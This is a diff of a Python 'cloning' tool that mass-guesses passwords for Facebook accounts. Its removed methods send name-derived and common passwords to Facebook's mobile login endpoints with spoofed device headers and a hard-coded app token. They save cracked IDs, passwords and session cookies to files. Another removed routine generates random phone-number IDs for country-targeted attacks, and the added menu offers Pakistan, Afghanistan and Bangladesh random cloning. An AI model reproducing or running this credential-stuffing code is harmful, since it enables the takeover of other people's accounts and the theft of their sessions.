-            fbsv = f"{random.uniform(4.0, 10.0):.1f}"
-            density = random.choice(["2.0","2.25","2.75","3.0","3.25","3 75"])
-            width = random.randint(720, 1440)
-            height = random.randint(1080, 2560)
-            fblc = random.choice(["ja_JP","ex_MX","en_CU","en_US","fr_FR","es_ES","pt_BR","de_DE","it_IT","ja_JP","ko_KR","ru_RU","zh_CN","ar_AE","en_GB"])
-            fbcr = random.choice(["Telenor","fido","MOVO AFRICA","UFONE-PAKTel","Zong","Jazz","SCO","Jio","Vodafone","Airtel","BSNL","MTNL","Grameenphone","Robi","Banglalink","Teletalk","Telkomsel","Indosat Ooredoo","Axiata","Tri","Smartfren","China Mobile","Unicom","Telecom","Satcom","Docomo","Rakuten","IIJmio","Orange","Verizon","AT&T","T-Mobile","Sprint","Vodafone","Telefonica","EE","Orange","Three"])
-            fban = random.choice(["FB4A", "FB5A", "FB6A"])
-            fbpn = random.choice(["com.facebook.katana", "com.facebook.orca","messenger-android", "com.facebook.lite"])
-            sony = random.choice(['SonyEricssonST25iv','SonyEricssonST25i','Xperia U'])
-            #######m3####
-            uaxx = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/412.0.0.22.115;FBPN/com.facebook.katana;FBLC/pt_BR;FBBV/468774204;FBCR/CLARO BR;FBMF/Xiaomi;FBBD/Redmi;FBDV/M1908C3JGG;FBSV/11;FBCA/arm64-v8a:null;FBDM/{density=2.75,width=1080,height=2216};FB_FW/1;FBRV/470765339;] FBBK/1'
-            ######
-            fs = name.split(' ')[0]
-            try:
-                ls = name.split(' ')[1]
-            except:
-                ls = fs
-            for pw in psw:
-                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())             
-                with requests.Session() as session:                                       
-                    data = {"adid": str(uuid.uuid4()),
-"format": "json",
-"device_id": str(uuid.uuid4()),
-"cpl": "true",
-"family_device_id": str(uuid.uuid4()),
-"secure_family_device_id": str(uuid.uuid4()),
-"credentials_type": "device_based_login_password",
-"error_detail_type": "button_with_disabled",
-"source": "account_recovery",
-'sim_serials': "['80973453345210784798']",
-'openid_flow': 'android_login',
-'openid_provider': 'google',
-"email": sid,
-"password": ps,
-"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
-"generate_session_cookies": "1",
-"meta_inf_fbmeta": "V2_UNTAGGED",
-'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",
-"advertiser_id": str(uuid.uuid4()),
-"currently_logged_in_userid": "0",
-"locale": "en_US",
-"client_country_code": "US",
-"method": "auth.login",
-"fb_api_req_friendly_name": "authenticate",
-"fb_api_caller_class": "AuthOperations$PasswordAuthOperation",
-"api_key": "882a8490361da98702bf97a021ddc14d"}
-                content_lenght = ("&").join([ "%s=%s" % (key, value) for key, value in data.items() ])
-                headers = {'User-Agent':uaxx,
-'Content-Type': 'application/x-www-form-urlencoded',
-'x-fb-Connection-Type': 'MOBILE.LTE',
-'Accept': '*/*',
-'Host': 'graph.facebook.com',
-'X-FB-Net-HNI': str(random.randint(2e4, 4e4)),
-'X-FB-SIM-HNI': str(random.randint(2e4, 4e4)),
-'X-Fb-Connection-Bandwidth': str(random.randint(20000000, 30000000)),
-'Priority' : 'u=3,i',
-'Zero-Rated': '0',
-'X-Fb-Connection-Quality': 'GOOD',
-'X-FB-Friendly-Name': 'authenticate',
-'X-FB-Request-Analytics-Tags': 'graphservice',
-'X-Fb-Device-Group': '5120',
-'X-FB-HTTP-Engine': 'Liger',
-'X-FB-Client-IP': 'True',
-'X-FB-Server-Cluster': 'True',
-'Content-Length': str(len(content_lenght))}
-                q = session.post("https://api.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
-                if 'session_key' in q:
-                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);NIXb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={NIXb};{ckkk}"
-                    print(f"\r{R} \x1b[38;5;196m[\033[38;5;46mNIX-💚\x1b[38;5;196m] \x1b[38;5;46m{sid} \x1b[1;92m●\x1b[38;5;46m {ps} {S}\n=#={ckkk}")
-                    
-                    Elite(sid,ps,ckkk)
-                    oks.append(sid)
-                    open('/sdcard/NIX/OK_ids_M3.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/NIX/COOKiEs_M3.txt','a').write(sid+'●'+ps+'●'+cookie+'\n')
-                    break
-                elif 'www.facebook.com' in q['error']['message']:
-                   # print(f"\r\x1b[1;96m [NIX-CP] {sid} ● {ps} {S}")
-                    cps.append(sid)
-                    open('/sdcard/NIX/M3-CP.txt','a').write(sid+'●'+ps+'\n')
-                else:
-                    continue
-            loop+=1
-        except requests.exceptions.ConnectionError:
-            self.methodC(sid, name, ps)
-        except Exception as e:
-            pass
-            
-    def methodB(self, sid, name, psw):
-        try:
-            global oks,cps,loop
-            sys.stdout.write(f'\r\r\33[1;92m [\33[1;92mNIX-XD-M2\33[1;92m] %s | \033[1;92mOK:-%s  \033[1;92m'%(loop,len(oks)));sys.stdout.flush()
-            sys.stdout.flush()
-            android_version = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
-            facebook_version = f'{random.randint(10,432)}.0.0.{random.randint(11,99)}.{random.randint(1,200)}'
-            fbbv = str(random.randint(10000000, 99999999))
-            fbrv = str(random.randint(10000000, 99999999))
-            fbsv = f"{random.uniform(4.0, 10.0):.1f}"
-            density = random.choice(["2.0","2.25","2.75","3.0","3.25","3.75"])
-            width = random.randint(720, 1440)
-            height = random.randint(1080, 2560)
-            fblc = random.choice(["ja_JP","ex_MX","en_CU","en_US","fr_FR","es_ES","pt_BR","de_DE","it_IT","ja_JP","ko_KR","ru_RU","zh_CN","ar_AE","en_GB"])
-            fbcr = random.choice(["Telenor","fido","MOVO AFRICA","UFONE-PAKTel","Zong","Jazz","SCO","Jio","Vodafone","Airtel","BSNL","MTNL","Grameenphone","Robi","Banglalink","Teletalk","Telkomsel","Indosat Ooredoo","Axiata","Tri","Smartfren","China Mobile","Unicom","Telecom","Satcom","Docomo","Rakuten","IIJmio","Orange","Verizon","AT&T","T-Mobile","Sprint","Vodafone","Telefonica","EE","Orange","Three"])
-            fban = random.choice(["FB4A", "FB5A", "FB6A"])
-            fbpn = random.choice(["com.facebook.katana", "com.facebook.orca","messenger-android", "com.facebook.lite"])
-            sony = random.choice(['SonyEricssonST25iv','SonyEricssonST25i','Xperia U'])
-            ####m2######
-            uaxx = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/72.0.0.1138;FBBV/6304476;[FBAN/Orca-Android;FBAV/424.0.0.25.113;FBPN/com.facebook.orca;FBLC/en_US;FBBV/510343531;FBCR/Verizon ;FBMF/motorola;FBBD/motorola;FBDV/moto g play - 2023;FBSV/12;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.75,width=720,height=1439};FB_FW/1;]'
-            fs = name.split(' ')[0]
-            try:
-                ls = name.split(' ')[1]
-            except:
-                ls = fs
-            for pw in psw:
-                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())             
-                with requests.Session() as session:                                       
-                    data = {"adid": str(uuid.uuid4()),
-"format": "json",
-"device_id": str(uuid.uuid4()),
-"cpl": "true",
-"family_device_id": str(uuid.uuid4()),
-"secure_family_device_id": str(uuid.uuid4()),
-"credentials_type": "device_based_login_password",
-"error_detail_type": "button_with_disabled",
-"source": "account_recovery",
-'sim_serials': "['80973453345210784798']",
-'openid_flow': 'android_login',
-'openid_provider': 'google',
-"email": sid,
-"password": ps,
-"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
-"generate_session_cookies": "1",
-"meta_inf_fbmeta": "V2_UNTAGGED",
-'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",
-"advertiser_id": str(uuid.uuid4()),
-"currently_logged_in_userid": "0",
-"locale": "en_US",
-"client_country_code": "US",
-"method": "auth.login",
-"fb_api_req_friendly_name": "authenticate",
-"fb_api_caller_class": "AuthOperations$PasswordAuthOperation",
-"api_key": "882a8490361da98702bf97a021ddc14d"}
-                content_lenght = ("&").join([ "%s=%s" % (key, value) for key, value in data.items() ])
-                headers = {'User-Agent':uaxx,
-'Content-Type': 'application/x-www-form-urlencoded',
-'x-fb-Connection-Type': 'MOBILE.LTE',
-'Accept': '*/*',
-'Host': 'graph.facebook.com',
-'X-FB-Net-HNI': str(random.randint(2e4, 4e4)),
-'X-FB-SIM-HNI': str(random.randint(2e4, 4e4)),
-'X-Fb-Connection-Bandwidth': str(random.randint(20000000, 30000000)),
-'Priority' : 'u=3,i',
-'Zero-Rated': '0',
-'X-Fb-Connection-Quality': 'GOOD',
-'X-FB-Friendly-Name': 'authenticate',
-'X-FB-Request-Analytics-Tags': 'graphservice',
-'X-Fb-Device-Group': '5120',
-'X-FB-HTTP-Engine': 'Liger',
-'X-FB-Client-IP': 'True',
-'X-FB-Server-Cluster': 'True',
-'Content-Length': str(len(content_lenght))}
-                q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
-                if 'session_key' in q:
-                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);NIXb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={NIXb};{ckkk}"
-                    print(f"\r{R} \x1b[38;5;196m[\033[38;5;46mNIX-💚\x1b[38;5;196m] \x1b[38;5;46m{sid} \x1b[1;92m●\x1b[38;5;46m {ps} {S}\n=#={ckkk}")
-                    
-                    Elite(sid,ps,ckkk)
-                    oks.append(sid)
-                    open('/sdcard//NIX/OK_ids_M2.txt','a').write(sid+'●'+ps+'\n');open('/sdcard/NIX/COOKiEs_M2.txt','a').write(sid+'●'+ps+'●'+cookie+'\n')
-                    break
-                elif 'www.facebook.com' in q['error']['message']:
-                    #print(f"\r\x1b[1;96m [NIX-CP] {sid} ● {ps} {S}")
-                    cps.append(sid)
-                    open('/sdcard/NIX/M2-CP.txt','a').write(sid+'●'+ps+'\n')
-                else:
-                    continue
-            loop+=1
-        except requests.exceptions.ConnectionError:
-            self.methodB(sid, name, ps)
+        print(" [\033[1;32m1\033[97;1m] FILE CLONING")
+        print(" [\033[1;32m2\033[97;1m] RANDOM CLONING")
+        print(" [\033[1;32m3\033[97;1m] JOIN GROUP ")
+        print(" [\033[1;32m4\033[97;1m] CONTACT ADMIN")
+        print(" [\033[1;32m0\033[97;1m] \033[1;31mEXIT TOOL")
+        line()
+ 
+        opt1 = input(" [•] Choose : ")
+        if opt1 == "1": method()
+        
+        elif opt1 == "2":
+            clear();print(' [\033[1;32m1\033[97;1m] Pakistan Random Cloning');print(' [\033[1;32m2\033[97;1m] Afg Random Cloning');print(' [\033[1;32m3\033[97;1m] Bengla  Random Cloning');print(' [\033[1;32m4\033[97;1m] Email Cloning');print(' [\033[1;32m0\033[97;1m] \033[1;31mBack Main Menu');line()
+            opt = input(' [•] Choose : ')
+            if opt == '1':pak()
+            if opt == '2':afg()
+            if opt== '3':bd()
+            if opt== '4':gmail()
+            else:line();print('\033[1;33m [•]\033[1;31m Selected Wrong Option ');time.sleep(2);Main_VENOM()
+    
 
-    def methodD(self, sid, name, psw):
-        try:
-            global oks,cps,loop
-            sys.stdout.write(f'\r\r\33[1;92m [\33[1;92mNIX-XD-M4\33[1;92m] %s | \033[1;92mOK:-%s  \033[1;92m'%(loop,len(oks)));sys.stdout.flush()
-            sys.stdout.flush()
-            android_version = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
-            facebook_version = f'{random.randint(10,432)}.0.0.{random.randint(11,99)}.{random.randint(1,200)}'
-            fbbv = str(random.randint(10000000, 99999999))
-            fbrv = str(random.randint(10000000, 99999999))
-            fbsv = f"{random.uniform(4.0, 10.0):.1f}"
-            density = random.choice(["2.0","2.25","2.75","3.0","3.25","3 75"])
-            width = random.randint(720, 1440)
-            height = random.randint(1080, 2560)
-            fblc = random.choice(["ja_JP","ex_MX","en_CU","en_US","fr_FR","es_ES","pt_BR","de_DE","it_IT","ja_JP","ko_KR","ru_RU","zh_CN","ar_AE","en_GB"])
-            fbcr = random.choice(["Telenor","fido","MOVO AFRICA","UFONE-PAKTel","Zong","Jazz","SCO","Jio","Vodafone","Airtel","BSNL","MTNL","Grameenphone","Robi","Banglalink","Teletalk","Telkomsel","Indosat Ooredoo","Axiata","Tri","Smartfren","China Mobile","Unicom","Telecom","Satcom","Docomo","Rakuten","IIJmio","Orange","Verizon","AT&T","T-Mobile","Sprint","Vodafone","Telefonica","EE","Orange","Three"])
-            fban = random.choice(["FB4A", "FB5A", "FB6A"])
-            fbpn = random.choice(["com.facebook.katana", "com.facebook.orca","messenger-android", "com.facebook.lite"])
-            sony = random.choice(['SonyEricssonST25iv','SonyEricssonST25i','Xperia U'])
-            #####m4#####
-            uaxx = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/72.0.0.1138;FBBV/6304476;[FBAN/Orca-Android;FBAV/424.0.0.25.113;FBPN/com.facebook.orca;FBLC/en_US;FBBV/510343531;FBCR/Verizon ;FBMF/motorola;FBBD/motorola;FBDV/moto g play - 2023;FBSV/12;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.75,width=720,height=1439};FB_FW/1;]'
-            fs = name.split(' ')[0]
-            try:
-                ls = name.split(' ')[1]
-            except:
-                ls = fs
-            for pw in psw:
-                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())             
-                with requests.Session() as session:                                       
-                    data = {"adid": str(uuid.uuid4()),
-"format": "json",
-"device_id": str(uuid.uuid4()),
-"cpl": "true",
-"family_device_id": str(uuid.uuid4()),
-"secure_family_device_id": str(uuid.uuid4()),
-"credentials_type": "device_based_login_password",
-"error_detail_type": "button_with_disabled",
-"source": "account_recovery",
-'sim_serials': "['80973453345210784798']",
-'openid_flow': 'android_login',
-'openid_provider': 'google',
-"email": sid,
-"password": ps,
-"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
-"generate_session_cookies": "1",
-"meta_inf_fbmeta": "V2_UNTAGGED",
-'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",
-"advertiser_id": str(uuid.uuid4()),
-"currently_logged_in_userid": "0",
-"locale": "en_US",
-"client_country_code": "US",
-"method": "auth.login",
-"fb_api_req_friendly_name": "authenticate",
-"fb_api_caller_class": "AuthOperations$PasswordAuthOperation",
-"api_key": "882a8490361da98702bf97a021ddc14d"}
-                content_lenght = ("&").join([ "%s=%s" % (key, value) for key, value in data.items() ])
-                headers = {'User-Agent':uaxx,
-'Content-Type': 'application/x-www-form-urlencoded',
-'x-fb-Connection-Type': 'MOBILE.LTE',
-'Accept': '*/*',
-'Host': 'graph.facebook.com',
-'X-FB-Net-HNI': str(random.randint(2e4, 4e4)),
-'X-FB-SIM-HNI': str(random.randint(2e4, 4e4)),
-'X-Fb-Connection-Bandwidth': str(random.randint(20000000, 30000000)),
-'Priority' : 'u=3,i',
-'Zero-Rated': '0',
-'X-Fb-Connection-Quality': 'GOOD',
-'X-FB-Friendly-Name': 'authenticate',
-'X-FB-Request-Analytics-Tags': 'graphservice',
-'X-Fb-Device-Group': '5120',
-'X-FB-HTTP-Engine': 'Liger',
-'X-FB-Client-IP': 'True',
-'X-FB-Server-Cluster': 'True',
-'Content-Length': str(len(content_lenght))}
-                q = session.post("https://b-api.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
-                if 'session_key' in q:
-                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);NIXb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={NIXb};{ckkk}"
-                    print(f"\r{R} \x1b[38;5;196m[\033[38;5;46mNIX-💚\x1b[38;5;196m] \x1b[38;5;46m{sid} \x1b[1;92m●\x1b[38;5;46m {ps} {S}\n=#={ckkk}")
-                    
-                    Elite(sid,ps,ckkk)
-                    oks.append(sid)
-                    open('/sdcard/NIX/OK_ids_M4.txt','a').write(sid+'●'+ps+'\n');open('/sdcard/NIX/COOKiEs_M2.txt','a').write(sid+'●'+ps+'●'+cookie+'\n')
-                    break
-                elif 'www.facebook.com' in q['error']['message']:
-                  #    print(f"\r\x1b[1;96m [Fuck] {sid} | {ps} {S}")
-                    cps.append(sid)
-                    open('/sdcard//NIX/M4-CP.txt','a').write(sid+'●'+ps+'\n')
-                else:
-                    continue
-            loop+=1
-        except requests.exceptions.ConnectionError:
-             self.methodD(sid, name, ps)
-           
-    def pasw(self):       
-            pw = []
-            clear()
-            print('\x1b[38;5;196m[\x1b[1;92m●\x1b[38;5;196m] \033[38;5;46mHow many passwords do you want to add')
-            sl = int(input('\x1b[38;5;196m[\x1b[1;92m●\x1b[38;5;196m]\033[38;5;46mPut Limit \x1b[1;92m●  '))
-            if sl =='':
-                print('\n\x1b[38;5;196m[\x1b[1;92m●\x1b[38;5;196m]\033[38;5;46mPut limit between 1 to 30')
-            elif sl > 20:
-                print('\n\x1b[38;5;196m[\x1b[1;92m●\x1b[38;5;196m]\x1b[38;5;196mPassword limit Should Not Be Greater Than 30')
-            else:
-                for sr in range(sl):
-                    pw.append(input(f'\x1b[38;5;196m[\x1b[1;92m●\x1b[38;5;196m]\033[38;5;46mPut Password {sr+1}\x1b[1;92m ●  '))
-            os.system("clear")
-            print(logo)
-            print(f' TOTAL IDS FOR CLONE  :\033[38;5;46m %s ' % len(self.id))
-            print(f'\x1b[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
-            print("\x1b[38;5;46mUse Airplane Mode More  OK IDS")
-            from datetime import datetime
-            now = datetime.now()
-            current_time = now.strftime("%H:%M:%S")
-            print("\x1b[38;5;46mCloneing Start Time \x1b[1;92m●\x1b[38;5;46m ", current_time)
-            print("\x1b[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
-            with SiamNIX(max_workers=30) as NIXworld:
-                for zsb in self.id:
-                   try:
-                       uid, name = zsb.split('|')
-                       sz = name.split(' ')
-                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
-                           pwx =  pw
-                       else:
-                            pwx =  pw
-                            if 'methodA' in methods:
-                                NIXworld.submit(self.methodA, uid, name, pwx)
-                            elif 'methodB' in methods:
-                                NIXworld.submit(self.methodB, uid, name, pwx)
-                            elif 'methodC' in methods:
-                                NIXworld.submit(self.methodC, uid, name, pwx)
-                            elif 'methodD' in methods:
-                                NIXworld.submit(self.methodD, uid, name, pwx)
-                   except:pass
-            result(oks,cps)
+        elif opt1 == "4":
+            clear();print(' [\033[1;32m1\033[97;1m] Contact To Whatsapp');print(' [\033[1;32m2\033[97;1m] Contact To Facebook');print(' [\033[1;32m0\033[97;1m] \033[1;31mBack Main Menu');line()
+            d=input(' [•] Choose : ')
+            if d == '1':os.system('xdg-open https://api.whatsapp.com/send?phone=+994409879304/');Main_VENOM()
+            if d == '2':os.system('xdg-open https://www.facebook.com/usman.rajpoot.1100');Main_VENOM()
+ 
+            if d == '0':Main_VENOM()
+            else:line();print('\033[1;33m [•]\033[1;31m Selected Wrong Option ');time.sleep(2);Main_VENOM()
+        elif opt1 == "3":
+            clear();print(' [\033[1;32m1\033[97;1m] Join WhatsApp Group');print(' [\033[1;32m2\033[97;1m] Join Facebook Group');print(' [\033[1;32m0\033[97;1m] \033[1;31mBack Main Menu');line()
+            d=input(' [•] Choose : ')
+            if d == '1':os.system('xdg-open https://chat.whatsapp.com/HEhfeaajh1IITDiVpyJI7z');Main_VENOM()
+            if d == '2':os.system('xdg-open https://facebook.com/groups/1245912839659325/');Main_VENOM()
+            if d == '0':Main_VENOM()
+            else:line();print('\033[1;33m [•]\033[1;31m Selected Wrong Option ');time.sleep(2);Main_VENOM()
+ 
+        elif opt1 == "0":line();print('[•] Thanks For Use\n[•] See You Again ');exit()
+        else:line();print('\033[1;33m [•]\033[1;31m Selected Wrong Option ');time.sleep(2);Main_VENOM()
+    
 
-#######################
-def AFG_CLONING():
-    user=[]
-    os.system('clear')
-    print(logo)
-    print(' EXAMPLE ANY COUNTRY SIM CODE')
-    linex()
-    kode = input(' CHOSE SIM CODE : ==>')
-    linex()
-    os.system('clear')
-    print(logo)
-    print(' EXAMPLE LIMIT [5000] [10000] [50000] [999999]')
-    linex()
-    limit = int(input(' INPUT  LEMIT : '))
-    print(46*'-')
-    for nmbr in range(limit):
-        nmp = ''.join(random.choice(string.digits) for _ in range(7))
-        user.append(nmp)
-    with ThreadPool(max_workers=70) as Aryan:
-        os.system('clear')
-        print(logo)
-        tl = str(len(user))
-        print(' CHOICE  ACOUNTS : '+tl)
-        print(' CHOICE SIM  CODE :\x1b[1;92m '+kode)
-        print('\x1b[1;92m THE PROCESS IS RUNNING IN THE BACKGROUND PLZ WAIT')
-        linex()
-        for guru in user:
-            uid = kode+guru
-            pwx=[guru+guru,'۱۲۳۴۵۶','Afghanistan','۱۲۳۴۵۶۷۸۹','kabul123','Afghan123','10002000','700800','Afghan12345','50006000','57573200','5727200','446688','first last']
-            Aryan.submit(rcrack,uid,pwx,tl)
-    print(46*'-')
-    print('IDZ SAVED IN OK.txt : CP.txt')
-    print(46*'-')
-    print('THE PROCESS HAS BEEN COMPLETED')
-    input('PRESS ENTER TO BACK ')
-    EMRAN()
-#----------def crack----------------#
-def rcrack(uid,pwx,tl):
-    #print(user)
-    global loop
-    global cps
-    global oks
-    global proxy
+###########______###########
+
+def method():
+    clear();print("\033[1;32m [•]\033[1;37m For Example : \033[1;32m/sdcard/VENOM.txt");line()
+    file = input("\033[1;32m [?]\033[1;37m Put File Path : ")
     try:
-        for ps in pwx:
-            pro = random.choice(ugen)
-            session = requests.Session()
-            free_fb = session.get('https://m.facebook.com').text
-            log_data = {
-          "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
-            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
-            "try_number":"0",
-            "unrecognized_tries":"0",
-            "email":uid,
-            "pass":ps,
-            "login":"Log In"}
-            header_freefb = {"authority": 'm.facebook.com',
-            "method": 'GET',         
-            "scheme": 'https',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'en-US,en;q=0.9',
-    'cache-control': 'max-age=0',
-    'dpr': '3',
-    'referer': 'https://m.facebook.com/',
-    'sec-ch-prefers-color-scheme': 'dark',
-    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
-    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-model': '"Infinix X678B"',
-    'sec-ch-ua-platform': '"Android"',
-    'sec-ch-ua-platform-version': '"13.0.0"',
-    'sec-fetch-dest': 'document',
-    'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'same-origin',
-    'sec-fetch-user': '?1',
-    'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
-    'viewport-width': '980',
-}
+ 
+        fo = open(file,'r').read().splitlines()
+    except FileNotFoundError:
+        line();print(f'\033[1;31m [!]\033[1;37m File location not found ');time.sleep(2);method()
